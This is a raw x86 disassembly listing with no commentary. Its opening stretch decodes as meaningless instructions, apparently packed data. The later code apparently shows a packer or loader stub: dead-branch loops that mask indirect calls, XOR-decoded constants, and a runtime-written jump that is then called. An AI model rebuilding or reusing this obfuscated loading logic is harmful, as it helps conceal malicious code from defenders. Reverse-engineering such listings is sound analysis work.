  40c08a:	push   esp
  40c08b:	outs   dx,BYTE PTR cs:[esi]
  40c08d:	jg     0x40c050
  40c08f:	jmp    0xb1782c40
  40c094:	cmp    cl,bl
  40c096:	sbb    DWORD PTR [eax],esi
  40c098:	dec    ebp
  40c099:	dec    eax
  40c09a:	pop    edi
  40c09b:	stc    
  40c09c:	loope  0x40c0b8
  40c09e:	stc    
  40c09f:	mov    ds:0xdda876ee,eax
  40c0a4:	out    dx,eax
  40c0a5:	lods   al,BYTE PTR ds:[esi]
  40c0a6:	hlt    
  40c0a7:	pop    eax
  40c0a8:	xor    DWORD PTR [ebp+0x65a911f],0xffffffbe
  40c0af:	mov    eax,0x8f055f69
  40c0b4:	loop   0x40c12e
  40c0b6:	lods   al,BYTE PTR ds:[esi]
  40c0b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0b8:	cli    
  40c0b9:	and    al,0x2c
  40c0bb:	sbb    eax,0xe6bd9b05
  40c0c0:	rcl    DWORD PTR [ecx],1
  40c0c2:	fisttp WORD PTR [edx+0x68]
  40c0c5:	push   ebp
  40c0c6:	daa    
  40c0c7:	lahf   
  40c0c8:	push   es
  40c0c9:	inc    ebx
  40c0ca:	mov    ecx,0xacd27b2d
  40c0cf:	or     al,0x98
  40c0d1:	pop    eax
  40c0d2:	inc    ebp
  40c0d3:	cld    
  40c0d4:	xchg   esi,eax
  40c0d5:	jmp    0x6354ef10
  40c0da:	inc    ebx
  40c0db:	jmp    0x53cb:0x1c3c3348
  40c0e2:	pop    es
  40c0e3:	js     0x40c111
  40c0e5:	repnz test al,0xa7
  40c0e8:	fld    st(5)
  40c0ea:	into   
  40c0eb:	sbb    al,0x56
  40c0ed:	xor    eax,0xdb599f80
  40c0f2:	xchg   ecx,eax
  40c0f3:	mov    al,0x18
  40c0f5:	ret    0x1671
  40c0f8:	ret    0x60d3
  40c0fb:	and    eax,0x2f778293
  40c100:	pop    edi
  40c101:	jo     0x40c14b
  40c103:	cmp    eax,0x84a77a00
  40c108:	add    edi,edi
  40c10a:	xor    dl,0xda
  40c10d:	jb     0x40c183
  40c10f:	sbb    ebx,edi
  40c111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c112:	adc    BYTE PTR [edx-0x7f5ca5c0],dh
  40c118:	xor    DWORD PTR [ebp-0x8b5a055],ebp
  40c11e:	clc    
  40c11f:	sub    eax,0x8003cca3
  40c124:	ret    0x5661
  40c127:	pop    ds
  40c128:	clc    
  40c129:	mov    ch,0xc8
  40c12b:	cmp    eax,0xa15ebf23
  40c130:	std    
  40c131:	pushf  
  40c132:	(bad)  
  40c133:	fdivrp st(3),st
  40c135:	adc    eax,eax
  40c137:	aam    0x10
  40c139:	push   es
  40c13a:	push   esi
  40c13b:	gs jmp esp
  40c13e:	jb     0x40c0ee
  40c140:	sub    eax,0xce04d0b5
  40c145:	neg    DWORD PTR [edx+0x48]
  40c148:	test   DWORD PTR fs:[ebx+0x2a],ebp
  40c14c:	enter  0xa19b,0xd6
  40c150:	sahf   
  40c151:	(bad)  
  40c152:	sbb    edi,edi
  40c154:	or     eax,ebx
  40c156:	fcomp  QWORD PTR [edi+edi*1-0x7d]
  40c15a:	or     dl,BYTE PTR [edi+eiz*1+0x32]
  40c15e:	sub    ch,BYTE PTR [edx+0x7172e2fe]
  40c164:	hlt    
  40c165:	jmp    0x40c0e7
  40c167:	jmp    0x40c197
  40c169:	inc    ebp
  40c16a:	dec    ebx
  40c16b:	addr16 xchg edx,eax
  40c16d:	rcr    DWORD PTR cs:[ecx+0x709a6c0e],cl
  40c174:	das    
  40c175:	push   ds
  40c176:	jmp    0xeffe:0xaaa1204a
  40c17d:	mov    ch,BYTE PTR [eax-0x10]
  40c180:	inc    eax
  40c181:	jmp    0x40c183
  40c183:	inc    ebp
  40c184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c185:	stos   DWORD PTR es:[edi],eax
  40c186:	xchg   edx,eax
  40c187:	ret    
  40c188:	cs int 0x71
  40c18b:	sbb    bh,BYTE PTR [ebx]
  40c18d:	xchg   esi,ebp
  40c18f:	inc    ebx
  40c190:	fld    QWORD PTR [edi]
  40c192:	xor    al,0x75
  40c194:	aam    0xdc
  40c196:	fisttp DWORD PTR [ecx]
  40c198:	lahf   
  40c199:	push   ds
  40c19a:	pop    es
  40c19b:	mov    ch,0x49
  40c19d:	add    eax,0xc75bea66
  40c1a2:	test   eax,0x5c6cbf01
  40c1a7:	gs cmp al,0x4e
  40c1aa:	add    BYTE PTR [esi-0x72],ah
  40c1ad:	sub    ecx,DWORD PTR [edi-0xaaada28]
  40c1b3:	mov    bl,0xa2
  40c1b5:	leave  
  40c1b6:	(bad)  [ebp-0x4a]
  40c1b9:	lods   al,BYTE PTR ds:[esi]
  40c1ba:	mov    eax,ds:0x55631c82
  40c1bf:	out    0xa2,al
  40c1c1:	into   
  40c1c2:	ins    DWORD PTR es:[edi],dx
  40c1c3:	adc    eax,0xc752e738
  40c1c8:	enter  0x6124,0x8a
  40c1cc:	popf   
  40c1cd:	inc    eax
  40c1ce:	das    
  40c1cf:	stc    
  40c1d0:	pop    edi
  40c1d1:	lahf   
  40c1d2:	neg    bl
  40c1d4:	sbb    ah,BYTE PTR [eax+0x4e]
  40c1d7:	jb     0x40c1be
  40c1d9:	gs pop ebx
  40c1db:	mov    ah,0x67
  40c1dd:	aam    0x89
  40c1df:	imul   ecx,DWORD PTR ds:0x1ac69b0c,0x72
  40c1e6:	cmp    al,0xad
  40c1e8:	ret    
  40c1e9:	dec    ebx
  40c1ea:	mov    ds:0xff91cd7,eax
  40c1ef:	stos   DWORD PTR es:[edi],eax
  40c1f0:	retf   
  40c1f1:	push   0x5c
  40c1f3:	shl    edi,0xe
  40c1f6:	call   DWORD PTR [ebp+0x64]
  40c1f9:	int    0x11
  40c1fb:	lea    edx,ds:0xedc25040
  40c201:	(bad)  
  40c203:	data16 jae 0x40c196
  40c206:	jmp    0x5134a566
  40c20b:	test   al,0xa9
  40c20d:	push   edi
  40c20e:	mov    WORD PTR [ebp+0x46bfdff7],?
  40c214:	pop    ds
  40c215:	fst    QWORD PTR [ebx-0x6c]
  40c218:	adc    ebp,DWORD PTR [ebx]
  40c21a:	fs jmp 0x40c272
  40c21d:	mov    es,WORD PTR [ebx+0x47]
  40c220:	stc    
  40c221:	loope  0x40c1b5
  40c223:	xor    edi,esp
  40c225:	es jecxz 0x40c23a
  40c228:	mov    eax,ds:0x76038f35
  40c22d:	mov    dh,BYTE PTR [edx-0x1dcc4ae7]
  40c233:	pop    ds
  40c234:	sahf   
  40c235:	and    ah,BYTE PTR [eax+0x6c]
  40c238:	das    
  40c239:	icebp  
  40c23a:	sahf   
  40c23b:	xlat   BYTE PTR ds:[ebx]
  40c23c:	imul   ecx,DWORD PTR [edi-0x2a],0xffffff8d
  40c240:	fdiv   DWORD PTR [ecx]
  40c242:	or     ch,BYTE PTR [edi+0x35]
  40c245:	(bad)  
  40c246:	mov    DWORD PTR [edi],0xf3259365
  40c24c:	ret    0x4a3e
  40c24f:	and    al,0xb1
  40c251:	dec    ebx
  40c252:	mov    eax,0x5281f167
  40c257:	stc    
  40c258:	pop    eax
  40c259:	dec    edx
  40c25a:	call   0x88b2:0xe15fbacb
  40c261:	sbb    dh,bl
  40c263:	(bad)  
  40c265:	xchg   DWORD PTR [edi+0x76],esi
  40c268:	je     0x40c2e3
  40c26a:	push   0x1e
  40c26c:	ror    BYTE PTR [ecx],cl
  40c26e:	daa    
  40c26f:	pusha  
  40c270:	shr    DWORD PTR [eax+0x71],0x8d
  40c274:	js     0x40c237
  40c276:	mov    eax,ds:0xd1a891fb
  40c27b:	jns    0x40c229
  40c27d:	jmp    0xa008:0x2849ab0c
  40c284:	jp     0x40c23b
  40c286:	mov    esp,0x515da667
  40c28b:	pop    es
  40c28c:	(bad)  
  40c28e:	jecxz  0x40c214
  40c290:	fnstcw WORD PTR ds:0x52bab714
  40c296:	xor    BYTE PTR [eax],0xe5
  40c299:	iret   
  40c29a:	lock inc ecx
  40c29c:	sbb    BYTE PTR [eax-0x1f],bl
  40c29f:	(bad)  
  40c2a0:	loopne 0x40c2fa
  40c2a2:	mov    edi,fs
  40c2a4:	pushf  
  40c2a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2a6:	repnz loop 0x40c261
  40c2a9:	sahf   
  40c2aa:	push   eax
  40c2ab:	push   DWORD PTR [ebx]
  40c2ad:	mov    BYTE PTR [ebx],0xc7
  40c2b0:	cmp    ecx,eax
  40c2b2:	je     0x40c2cd
  40c2b8:	mov    eax,DWORD PTR [ebp-0x3c]
  40c2bb:	movzx  eax,WORD PTR [eax+ebx*2]
  40c2bf:	mov    ecx,DWORD PTR [ebp-0x14]
  40c2c2:	mov    eax,DWORD PTR [ecx+eax*4]
  40c2c5:	mov    DWORD PTR [ebp-0x40],eax
  40c2c8:	jmp    0x409eee
  40c2cd:	mov    eax,DWORD PTR [ebp-0xc]
  40c2d0:	xor    eax,esi
  40c2d2:	lea    ebx,[ebx+eax*1+0x3272e0]
  40c2d9:	jmp    0x407809
  40c2de:	mov    eax,DWORD PTR [ebp-0x4]
  40c2e1:	xor    eax,esi
  40c2e3:	add    eax,edi
  40c2e5:	jmp    0x40c407
  40c2ea:	mov    eax,DWORD PTR [ebp-0x40]
  40c2ed:	add    eax,DWORD PTR [ebp+0x8]
  40c2f0:	mov    DWORD PTR [ebp-0x18],eax
  40c2f3:	mov    eax,DWORD PTR [ebp-0x1c]
  40c2f6:	test   eax,eax
  40c2f8:	je     0x40c392
  40c2fe:	mov    DWORD PTR [ebp-0x28],0x0
  40c305:	push   0x3
  40c307:	xor    edx,edx
  40c309:	pop    edx
  40c30a:	add    edx,0x8
  40c30d:	push   edx
  40c30e:	pop    ecx
  40c30f:	push   0x6
  40c311:	dec    ecx
  40c312:	pop    ebx
  40c313:	dec    ebx
  40c314:	xchg   ebx,ecx
  40c316:	sub    ebx,ecx
  40c318:	xchg   ebx,ecx
  40c31a:	dec    ecx
  40c31b:	mov    eax,DWORD PTR [ebp-0x1c]
  40c31e:	imul   eax,ecx
  40c321:	sub    esp,eax
  40c323:	mov    DWORD PTR [ebp-0x28],esp
  40c326:	mov    eax,DWORD PTR [ebp-0x4]
  40c329:	xor    eax,esi
  40c32b:	add    eax,edi
  40c32d:	jmp    0x40c36b
  40c332:	mov    ecx,DWORD PTR [ebp-0xc]
  40c335:	mov    eax,DWORD PTR [ebp+0x8]
  40c338:	mov    edx,DWORD PTR [ebp+0x14]
  40c33b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c33f:	xor    ecx,esi
  40c341:	add    ecx,edi
  40c343:	xor    edx,edx
  40c345:	div    ecx
  40c347:	mov    ecx,DWORD PTR [ebp-0x4]
  40c34a:	xor    ecx,esi
  40c34c:	lea    eax,[ecx+eax*1+0x3272e0]
  40c353:	mov    ecx,DWORD PTR [ebp+0x8]
  40c356:	mov    edx,DWORD PTR [ebp-0x28]
  40c359:	mov    DWORD PTR [edx+ecx*4],eax
  40c35c:	mov    eax,DWORD PTR [ebp-0xc]
  40c35f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c362:	xor    eax,esi
  40c364:	lea    eax,[eax+ecx*1+0x3272e0]
  40c36b:	mov    DWORD PTR [ebp+0x8],eax
  40c36e:	mov    eax,DWORD PTR [ebp-0xc]
  40c371:	mov    ecx,DWORD PTR [ebp+0x14]
  40c374:	xor    eax,esi
  40c376:	add    eax,edi
  40c378:	imul   eax,DWORD PTR [ecx]
  40c37b:	mov    ecx,DWORD PTR [ebp-0x4]
  40c37e:	mov    edx,DWORD PTR [ebp+0x8]
  40c381:	xor    ecx,esi
  40c383:	lea    ecx,[ecx+edx*1+0x3272e0]
  40c38a:	cmp    ecx,eax
  40c38c:	jne    0x40c332
  40c392:	mov    eax,DWORD PTR [ebp-0x4]
  40c395:	xor    eax,esi
  40c397:	add    eax,edi
  40c399:	mov    DWORD PTR [ebp-0x10],eax
  40c39c:	mov    ebx,0x65655
  40c3a1:	add    ebx,0x3234
  40c3a7:	xchg   ebx,esi
  40c3a9:	xor    ebx,ebx
  40c3ab:	push   esi
  40c3ac:	mov    esi,ebx
  40c3ae:	pop    ebx
  40c3af:	mov    edx,esi
  40c3b1:	add    ebx,0x1002
  40c3b7:	lea    eax,[ebp-0x18]
  40c3ba:	add    edx,eax
  40c3bc:	add    edx,0x5
  40c3bf:	push   edx
  40c3c0:	inc    esi
  40c3c1:	pop    ecx
  40c3c2:	dec    ecx
  40c3c3:	xchg   ecx,eax
  40c3c4:	dec    eax
  40c3c5:	xchg   ecx,eax
  40c3c6:	dec    ecx
  40c3c7:	xchg   ecx,edx
  40c3c9:	dec    edx
  40c3ca:	push   edx
  40c3cb:	mov    edx,ebx
  40c3cd:	pop    ebx
  40c3ce:	dec    ebx
  40c3cf:	call   DWORD PTR [ebx]
  40c3d1:	cmp    DWORD PTR [ebp+0x10],esi
  40c3d4:	je     0x40c3f3
  40c3da:	xchg   edx,eax
  40c3db:	push   0xb
  40c3dd:	pop    ecx
  40c3de:	push   0x4
  40c3e0:	pop    ebx
  40c3e1:	inc    ebx
  40c3e2:	xchg   ebx,ecx
  40c3e4:	sub    ebx,ecx
  40c3e6:	xchg   ebx,ecx
  40c3e8:	dec    ecx
  40c3e9:	dec    ecx
  40c3ea:	mov    eax,DWORD PTR [ebp-0x1c]
  40c3ed:	imul   eax,ecx
  40c3f0:	add    esp,eax
  40c3f2:	xchg   edx,eax
  40c3f3:	push   eax
  40c3f4:	xor    ebx,ebx
  40c3f6:	mov    edx,esp
  40c3f8:	dec    edx
  40c3f9:	inc    ebx
  40c3fa:	add    ebx,DWORD PTR [edx+ebx*1]
  40c3fd:	dec    ebx
  40c3fe:	xor    edx,edx
  40c400:	add    DWORD PTR [ebp-0x10],ebx
  40c403:	pop    ebx
  40c404:	mov    eax,DWORD PTR [ebp-0x10]
  40c407:	pop    edi
  40c408:	pop    esi
  40c409:	pop    ebx
  40c40a:	leave  
  40c40b:	ret    0x10
  40c40e:	push   ebp
  40c40f:	mov    ebp,esp
  40c411:	sub    esp,0x7c
  40c414:	push   esi
  40c415:	xor    ecx,esi
  40c417:	push   edi
  40c418:	mov    eax,ds:0x42e313
  40c41d:	mov    DWORD PTR [ebp-0x24],eax
  40c420:	mov    eax,ds:0x42e41f
  40c425:	mov    DWORD PTR [ebp-0x34],eax
  40c428:	mov    DWORD PTR ds:0x42d01c,0x1b
  40c432:	cmp    DWORD PTR ds:0x42d01c,0x0
  40c439:	je     0x40c519
  40c43f:	cmp    DWORD PTR ds:0x42d01c,0x22
  40c446:	jne    0x40c457
  40c44c:	push   0x429028
  40c451:	call   DWORD PTR ds:0x42ecb3
  40c457:	xor    eax,eax
  40c459:	add    eax,DWORD PTR ds:0x42d01c
  40c45f:	dec    eax
  40c460:	mov    ds:0x42d01c,eax
  40c465:	jmp    0x40c432
  40c46a:	and    DWORD PTR ds:0x429010,0x0
  40c474:	xor    ecx,ecx
  40c476:	xor    ecx,DWORD PTR ds:0x429010
  40c47c:	inc    ecx
  40c47d:	mov    DWORD PTR ds:0x429010,ecx
  40c483:	cmp    DWORD PTR ds:0x429010,0x6
  40c48a:	jne    0x40c4a5
  40c490:	push   0x42a004
  40c495:	push   0x42b01c
  40c49a:	push   0x429010
  40c49f:	call   DWORD PTR ds:0x42ec73
  40c4a5:	cmp    DWORD PTR ds:0x429010,0x5
  40c4ac:	jne    0x40c4bf
  40c4b2:	mov    ecx,DWORD PTR ds:0x429010
  40c4b8:	inc    ecx
  40c4b9:	mov    DWORD PTR ds:0x429010,ecx
  40c4bf:	cmp    DWORD PTR ds:0x429010,0x16
  40c4c6:	jb     0x40c474
  40c4cc:	and    DWORD PTR ds:0x42c004,0x0
  40c4d6:	jmp    0x40c4e8
  40c4db:	mov    esi,DWORD PTR ds:0x42c004
  40c4e1:	inc    esi
  40c4e2:	mov    DWORD PTR ds:0x42c004,esi
  40c4e8:	cmp    DWORD PTR ds:0x42c004,0x1a
  40c4ef:	jae    0x40c519
  40c4f5:	cmp    DWORD PTR ds:0x42c004,0x23
  40c4fc:	jne    0x40c514
  40c502:	push   0x1
  40c504:	push   0x6fde
  40c509:	push   0x44e1
  40c50e:	call   DWORD PTR ds:0x42ec77
  40c514:	jmp    0x40c4db
  40c519:	and    DWORD PTR [ebp-0x30],0x0
  40c51d:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  40c524:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  40c52b:	mov    eax,DWORD PTR [ebp-0x10]
  40c52e:	and    DWORD PTR ds:0x429020,0x0
  40c538:	mov    ecx,DWORD PTR ds:0x429020
  40c53e:	inc    ecx
  40c53f:	mov    DWORD PTR ds:0x429020,ecx
  40c545:	cmp    DWORD PTR ds:0x429020,0x18
  40c54c:	jne    0x40c571
  40c552:	push   DWORD PTR [ebp-0x1c]
  40c555:	push   DWORD PTR [ebp-0x18]
  40c558:	push   0x42d004
  40c55d:	push   0x3a2d
  40c562:	push   DWORD PTR [ebp-0x18]
  40c565:	push   DWORD PTR [ebp-0x14]
  40c568:	push   DWORD PTR [ebp-0x1c]
  40c56b:	call   DWORD PTR ds:0x42ec7f
  40c571:	cmp    DWORD PTR ds:0x429020,0x10
  40c578:	jb     0x40c538
  40c57e:	xor    edi,ecx
  40c580:	mov    ecx,DWORD PTR [ebp-0x10]
  40c583:	mov    esi,DWORD PTR ds:0x42d000
  40c589:	and    DWORD PTR ds:0x42c018,esi
  40c58f:	sub    eax,ecx
  40c591:	sub    DWORD PTR ds:0x429028,edx
  40c597:	mov    DWORD PTR [ebp-0x10],eax
  40c59a:	xor    DWORD PTR [ebp-0x10],0xf89cb5b9
  40c5a1:	mov    eax,DWORD PTR [ebp-0x18]
  40c5a4:	and    DWORD PTR ds:0x429000,0x0
  40c5ae:	jmp    0x40c5c2
  40c5b3:	xor    esi,esi
  40c5b5:	xor    esi,DWORD PTR ds:0x429000
  40c5bb:	inc    esi
  40c5bc:	mov    DWORD PTR ds:0x429000,esi
  40c5c2:	cmp    DWORD PTR ds:0x429000,0x19
  40c5c9:	jae    0x40c645
  40c5cf:	cmp    DWORD PTR ds:0x429000,0x26
  40c5d6:	jne    0x40c5f7
  40c5dc:	push   0x42a000
  40c5e1:	push   DWORD PTR [ebp-0xc]
  40c5e4:	push   0x42e000
  40c5e9:	push   DWORD PTR [ebp-0x20]
  40c5ec:	push   0x21f7
  40c5f1:	call   DWORD PTR ds:0x42ec83
  40c5f7:	jmp    0x40c5b3
  40c5fc:	mov    DWORD PTR ds:0x42a018,0x13
  40c606:	cmp    DWORD PTR ds:0x42a018,0x0
  40c60d:	je     0x40c645
  40c613:	cmp    DWORD PTR ds:0x42a018,0x21
  40c61a:	jne    0x40c62b
  40c620:	push   0x42d008
  40c625:	call   DWORD PTR ds:0x42ec8b
  40c62b:	xor    esi,esi
  40c62d:	xor    esi,DWORD PTR ds:0x42a018
  40c633:	dec    esi
  40c634:	mov    DWORD PTR ds:0x42a018,esi
  40c63a:	jmp    0x40c606
  40c63f:	sub    DWORD PTR ds:0x42d01c,edx
  40c645:	mov    ecx,DWORD PTR [ebp-0x18]
  40c648:	sbb    edi,esi
  40c64a:	sub    eax,ecx
  40c64c:	and    DWORD PTR ds:0x429020,0x0
  40c656:	jmp    0x40c66a
  40c65b:	xor    esi,esi
  40c65d:	or     esi,DWORD PTR ds:0x429020
  40c663:	inc    esi
  40c664:	mov    DWORD PTR ds:0x429020,esi
  40c66a:	cmp    DWORD PTR ds:0x429020,0x14
  40c671:	jae    0x40c6b9
  40c677:	cmp    DWORD PTR ds:0x429020,0x5
  40c67e:	jne    0x40c69a
  40c684:	push   0x2bc2
  40c689:	push   DWORD PTR [ebp-0x28]
  40c68c:	push   0x42b010
  40c691:	push   DWORD PTR [ebp-0x14]
  40c694:	call   DWORD PTR ds:0x42ec8f
  40c69a:	cmp    DWORD PTR ds:0x429020,0x4
  40c6a1:	jne    0x40c6b4
  40c6a7:	mov    esi,DWORD PTR ds:0x429020
  40c6ad:	inc    esi
  40c6ae:	mov    DWORD PTR ds:0x429020,esi
  40c6b4:	jmp    0x40c65b
  40c6b9:	mov    DWORD PTR [ebp-0x18],eax
  40c6bc:	or     DWORD PTR [ebp-0x18],0xf89f05b9
  40c6c3:	mov    eax,DWORD PTR [ebp-0xc]
  40c6c6:	mov    ecx,DWORD PTR [ebp-0xc]
  40c6c9:	sub    eax,ecx
  40c6cb:	mov    DWORD PTR [ebp-0xc],eax
  40c6ce:	or     DWORD PTR [ebp-0xc],0xf89c85f9
  40c6d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40c6d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  40c6db:	sub    eax,ecx
  40c6dd:	mov    DWORD PTR [ebp-0x1c],eax
  40c6e0:	or     DWORD PTR [ebp-0x1c],0xf89c85d9
  40c6e7:	mov    eax,DWORD PTR [ebp-0x20]
  40c6ea:	mov    ecx,DWORD PTR [ebp-0x20]
  40c6ed:	sub    eax,ecx
  40c6ef:	mov    DWORD PTR [ebp-0x20],eax
  40c6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40c6f5:	mov    ecx,DWORD PTR [ebp-0x20]
  40c6f8:	mov    esi,0x7510899
  40c6fd:	xor    eax,esi
  40c6ff:	mov    edi,0x3272e0
  40c704:	add    eax,edi
  40c706:	or     eax,ecx
  40c708:	mov    DWORD PTR [ebp-0x20],eax
  40c70b:	mov    eax,DWORD PTR [ebp-0x4]
  40c70e:	mov    ecx,DWORD PTR [ebp-0x4]
  40c711:	sub    eax,ecx
  40c713:	mov    DWORD PTR [ebp-0x4],eax
  40c716:	or     DWORD PTR [ebp-0x4],0xf89c85bc
  40c71d:	mov    eax,DWORD PTR [ebp-0xc]
  40c720:	xor    eax,esi
  40c722:	add    eax,edi
  40c724:	push   eax
  40c725:	mov    eax,DWORD PTR [ebp-0x10]
  40c728:	xor    eax,esi
  40c72a:	add    eax,edi
  40c72c:	push   eax
  40c72d:	mov    eax,DWORD PTR [ebp-0x4]
  40c730:	xor    eax,esi
  40c732:	add    eax,edi
  40c734:	push   eax
  40c735:	lea    eax,[ebp-0x7c]
  40c738:	push   eax
  40c739:	push   DWORD PTR [ebp-0x2c]
  40c73c:	push   DWORD PTR [ebp-0x28]
  40c73f:	call   0x4115b7
  40c744:	test   eax,eax
  40c746:	je     0x40c774
  40c74c:	lea    eax,[ebp-0x7c]
  40c74f:	push   eax
  40c750:	mov    eax,DWORD PTR [ebp-0x28]
  40c753:	xor    eax,esi
  40c755:	add    eax,edi
  40c757:	push   eax
  40c758:	mov    eax,DWORD PTR [ebp-0x24]
  40c75b:	add    eax,0xaa
  40c760:	push   eax
  40c761:	mov    eax,DWORD PTR [ebp-0x24]
  40c764:	mov    eax,DWORD PTR [eax+0x198]
  40c76a:	push   DWORD PTR [eax]
  40c76c:	call   0x405286
  40c771:	mov    DWORD PTR [ebp-0x14],eax
  40c774:	lea    eax,[ebp+0x4]
  40c777:	mov    DWORD PTR [ebp-0x30],eax
  40c77a:	mov    eax,DWORD PTR [ebp-0x14]
  40c77d:	test   eax,eax
  40c77f:	je     0x40c7e7
  40c785:	lea    eax,[ebp-0x8]
  40c788:	mov    DWORD PTR [ebp-0x38],eax
  40c78b:	mov    eax,DWORD PTR [ebp-0x34]
  40c78e:	mov    DWORD PTR [ebp-0x8],eax
  40c791:	mov    eax,DWORD PTR [ebp-0x8]
  40c794:	mov    ecx,DWORD PTR [ebp-0x14]
  40c797:	sub    eax,ecx
  40c799:	mov    DWORD PTR [ebp-0x8],eax
  40c79c:	mov    ecx,DWORD PTR [ebp-0x4]
  40c79f:	xor    ecx,esi
  40c7a1:	mov    eax,0xffcd8d20
  40c7a6:	sub    eax,ecx
  40c7a8:	add    DWORD PTR [ebp-0x8],eax
  40c7ab:	mov    eax,DWORD PTR [ebp-0x8]
  40c7ae:	mov    ecx,DWORD PTR [ebp-0x14]
  40c7b1:	mov    DWORD PTR [ecx+0x1],eax
  40c7b4:	mov    eax,DWORD PTR [ebp-0x14]
  40c7b7:	push   DWORD PTR [ebp-0x24]
  40c7ba:	mov    BYTE PTR [eax],0xe9
  40c7bd:	mov    eax,ds:0x42e18f
  40c7c2:	push   DWORD PTR [eax]
  40c7c4:	push   DWORD PTR ds:0x42e3eb
  40c7ca:	push   DWORD PTR ds:0x42e197
  40c7d0:	push   DWORD PTR ds:0x42e3cb
  40c7d6:	push   DWORD PTR ds:0x42e9db
  40c7dc:	push   DWORD PTR [ebp-0x28]
  40c7df:	push   DWORD PTR [ebp-0x2c]
  40c7e2:	mov    eax,DWORD PTR [ebp-0x14]
  40c7e5:	call   eax
  40c7e7:	mov    eax,DWORD PTR [ebp-0x30]
  40c7ea:	mov    ecx,DWORD PTR ds:0x42e38f
  40c7f0:	add    DWORD PTR [eax],ecx
  40c7f2:	pop    edi
  40c7f3:	pop    esi
  40c7f4:	leave  
  40c7f5:	ret    
  40c7f6:	push   ebp
  40c7f7:	mov    ebp,esp
  40c7f9:	sub    esp,0x18
  40c7fc:	adc    edx,ecx
  40c7fe:	mov    DWORD PTR [ebp-0x10],0xf89f85b9
  40c805:	add    edx,ecx
  40c807:	lea    eax,[ebp+0x14]
  40c80a:	and    DWORD PTR ds:0x42d014,0x0
  40c814:	jmp    0x40c826
  40c819:	mov    ecx,DWORD PTR ds:0x42d014
  40c81f:	inc    ecx
  40c820:	mov    DWORD PTR ds:0x42d014,ecx
  40c826:	cmp    DWORD PTR ds:0x42d014,0x18
  40c82d:	jae    0x40c86f
  40c833:	cmp    DWORD PTR ds:0x42d014,0x8
  40c83a:	jne    0x40c846
  40c840:	call   DWORD PTR ds:0x42ec93
  40c846:	cmp    DWORD PTR ds:0x42d014,0x7
  40c84d:	jne    0x40c860
  40c853:	mov    ecx,DWORD PTR ds:0x42d014
  40c859:	inc    ecx
  40c85a:	mov    DWORD PTR ds:0x42d014,ecx
  40c860:	jmp    0x40c819
  40c865:	xor    DWORD PTR ds:0x42d004,0x7da9
  40c86f:	mov    DWORD PTR [ebp-0x4],eax
  40c872:	dec    edx
  40c873:	push   esi
  40c874:	and    DWORD PTR ds:0x42b004,0x0
  40c87e:	mov    esi,DWORD PTR ds:0x42b004
  40c884:	inc    esi
  40c885:	mov    DWORD PTR ds:0x42b004,esi
  40c88b:	cmp    DWORD PTR ds:0x42b004,0x4
  40c892:	jne    0x40c8b6
  40c898:	push   DWORD PTR [ebp-0x24]
  40c89b:	push   0x42c000
  40c8a0:	push   DWORD PTR [ebp-0x1c]
  40c8a3:	push   0x1834
  40c8a8:	push   0x14e1
  40c8ad:	push   DWORD PTR [ebp-0x24]
  40c8b0:	call   DWORD PTR ds:0x42ec97
  40c8b6:	cmp    DWORD PTR ds:0x42b004,0x3
  40c8bd:	jne    0x40c8d2
  40c8c3:	xor    esi,esi
  40c8c5:	xor    esi,DWORD PTR ds:0x42b004
  40c8cb:	inc    esi
  40c8cc:	mov    DWORD PTR ds:0x42b004,esi
  40c8d2:	cmp    DWORD PTR ds:0x42b004,0x16
  40c8d9:	jb     0x40c87e
  40c8df:	mov    esi,0xf89c85b9
  40c8e4:	adc    edx,DWORD PTR ds:0x429004
  40c8ea:	mov    DWORD PTR [ebp-0xc],esi
  40c8ed:	lea    eax,[ebp-0xc]
  40c8f0:	sbb    edx,DWORD PTR ds:0x42a004
  40c8f6:	mov    DWORD PTR [ebp-0x14],eax
  40c8f9:	xor    ecx,ecx
  40c8fb:	or     ecx,DWORD PTR ds:0x418f85
  40c901:	mov    ecx,DWORD PTR [ecx]
  40c903:	adc    DWORD PTR ds:0x42c018,ecx
  40c909:	mov    eax,DWORD PTR [ebp-0xc]
  40c90c:	add    DWORD PTR ds:0x42d004,0x429008
  40c916:	mov    edx,DWORD PTR [ebp-0x14]
  40c919:	mov    ecx,0x7510899
  40c91e:	xor    eax,ecx
  40c920:	sbb    DWORD PTR ds:0x42c010,0x429000
  40c92a:	add    eax,0x3272e0
  40c92f:	xor    DWORD PTR ds:0x42c018,0x1738
  40c939:	mov    DWORD PTR [edx],eax
  40c93b:	or     DWORD PTR ds:0x42a008,0x34e
  40c945:	mov    eax,ds:0x42e18b
  40c94a:	mov    edx,DWORD PTR [ebp-0x4]
  40c94d:	mov    eax,DWORD PTR [eax]
  40c94f:	sbb    DWORD PTR ds:0x42a010,0x361f
  40c959:	add    eax,DWORD PTR [edx]
  40c95b:	dec    edx
  40c95c:	push   edi
  40c95d:	mov    DWORD PTR ds:0x42a01c,0x1f
  40c967:	cmp    DWORD PTR ds:0x42a01c,0x0
  40c96e:	je     0x40c9b5
  40c974:	cmp    DWORD PTR ds:0x42a01c,0x3
  40c97b:	jne    0x40c987
  40c981:	call   DWORD PTR ds:0x42ec9b
  40c987:	cmp    DWORD PTR ds:0x42a01c,0x4
  40c98e:	jne    0x40c9a3
  40c994:	xor    edx,edx
  40c996:	or     edx,DWORD PTR ds:0x42a01c
  40c99c:	dec    edx
  40c99d:	mov    DWORD PTR ds:0x42a01c,edx
  40c9a3:	mov    edx,DWORD PTR ds:0x42a01c
  40c9a9:	dec    edx
  40c9aa:	mov    DWORD PTR ds:0x42a01c,edx
  40c9b0:	jmp    0x40c967
  40c9b5:	mov    DWORD PTR [ebp-0x8],eax
  40c9b8:	or     edi,edi
  40c9ba:	mov    edi,DWORD PTR [ebp+0x8]
  40c9bd:	adc    edx,edx
  40c9bf:	mov    eax,ds:0x42e313
  40c9c4:	mov    eax,DWORD PTR [eax+0x198]
  40c9ca:	xor    edi,ecx
  40c9cc:	mov    edx,0x3272e0
